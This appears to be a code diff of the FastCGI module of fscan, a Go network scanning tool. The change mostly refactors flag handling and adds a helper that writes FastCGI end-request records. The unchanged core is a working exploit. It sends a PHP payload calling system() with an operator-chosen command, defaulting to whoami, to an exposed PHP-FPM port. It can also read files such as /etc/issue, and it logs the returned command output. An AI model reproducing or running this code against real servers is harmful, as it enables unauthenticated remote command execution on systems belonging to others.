@@ -6,35 +6,34 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
+	"github.com/shadow1ng/fscan/common"
 	"io"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
-
-	"github.com/shadow1ng/fscan/common"
 )
 
 //links
 //https://xz.aliyun.com/t/9544
 //https://github.com/wofeiwo/webcgi-exploits
 
-func FcgiScan(info common.HostInfo, flags common.Flags) {
-	if flags.IsBrute {
+func FcgiScan(info *common.HostInfo) {
+	if common.IsBrute {
 		return
 	}
 	url := "/etc/issue"
-	if flags.Path != "" {
-		url = flags.Path
+	if common.Path != "" {
+		url = common.Path
 	}
 	addr := fmt.Sprintf("%v:%v", info.Host, info.Ports)
 	var reqParams string
 	var cutLine = "-----ASDGTasdkk361363s-----\n"
 	switch {
-	case flags.Command == "read":
+	case common.Command == "read":
 		reqParams = ""
-	case flags.Command != "":
-		reqParams = "<?php system('" + flags.Command + "');die('" + cutLine + "');?>"
+	case common.Command != "":
+		reqParams = "<?php system('" + common.Command + "');die('" + cutLine + "');?>"
 	default:
 		reqParams = "<?php system('whoami');die('" + cutLine + "');?>"
 	}
@@ -55,7 +54,7 @@ func FcgiScan(info common.HostInfo, flags common.Flags) {
 		env["REQUEST_METHOD"] = "GET"
 	}
 
-	fcgi, err := New(addr, flags)
+	fcgi, err := New(addr, common.Timeout)
 	defer func() {
 		if fcgi.rwc != nil {
 			fcgi.rwc.Close()
@@ -94,12 +93,12 @@ func FcgiScan(info common.HostInfo, flags common.Flags) {
 	//Access to the script '/etc/passwd' has been denied (see security.limit_extensions)
 	var result string
 	var output = string(stdout)
-	if strings.Contains(output, cutLine) { // 命令成功回显
-		out := strings.SplitN(output, cutLine, 2)[0]
+	if strings.Contains(output, cutLine) { //命令成功回显
+		output = strings.SplitN(output, cutLine, 2)[0]
 		if len(stderr) > 0 {
-			result = fmt.Sprintf("[+] FCGI:%v:%v \n%vstderr:%v\nplesa try other path,as -path /www/wwwroot/index.php", info.Host, info.Ports, out, string(stderr))
+			result = fmt.Sprintf("[+] FCGI: %v:%v \n%vstderr:%v\nplesa try other path,as -path /www/wwwroot/index.php", info.Host, info.Ports, output, string(stderr))
 		} else {
-			result = fmt.Sprintf("[+] FCGI:%v:%v \n%v", info.Host, info.Ports, out)
+			result = fmt.Sprintf("[+] FCGI: %v:%v \n%v", info.Host, info.Ports, output)
 		}
 		common.LogSuccess(result)
 	} else if strings.Contains(output, "File not found") || strings.Contains(output, "Content-type") || strings.Contains(output, "Status") {
@@ -183,8 +182,8 @@ type FCGIClient struct {
 	keepAlive bool
 }
 
-func New(addr string, flags common.Flags) (fcgi *FCGIClient, err error) {
-	conn, err := common.WrapperTcpWithTimeout("tcp", addr, common.Socks5{Address: flags.Socks5Proxy}, time.Duration(flags.Timeout)*time.Second)
+func New(addr string, timeout int64) (fcgi *FCGIClient, err error) {
+	conn, err := common.WrapperTcpWithTimeout("tcp", addr, time.Duration(timeout)*time.Second)
 	fcgi = &FCGIClient{
 		rwc:       conn,
 		keepAlive: false,
@@ -213,6 +212,13 @@ func (c *FCGIClient) writeRecord(recType uint8, reqId uint16, content []byte) (e
 func (c *FCGIClient) writeBeginRequest(reqId uint16, role uint16, flags uint8) error {
 	b := [8]byte{byte(role >> 8), byte(role), flags}
 	return c.writeRecord(FCGI_BEGIN_REQUEST, reqId, b[:])
+}
+
+func (c *FCGIClient) writeEndRequest(reqId uint16, appStatus int, protocolStatus uint8) error {
+	b := make([]byte, 8)
+	binary.BigEndian.PutUint32(b, uint32(appStatus))
+	b[4] = protocolStatus
+	return c.writeRecord(FCGI_END_REQUEST, reqId, b)
 }
 
 func (c *FCGIClient) writePairs(recType uint8, reqId uint16, pairs map[string]string) error {
@@ -341,6 +347,5 @@ OUTER:
 			break OUTER
 		}
 	}
-
 	return
 }
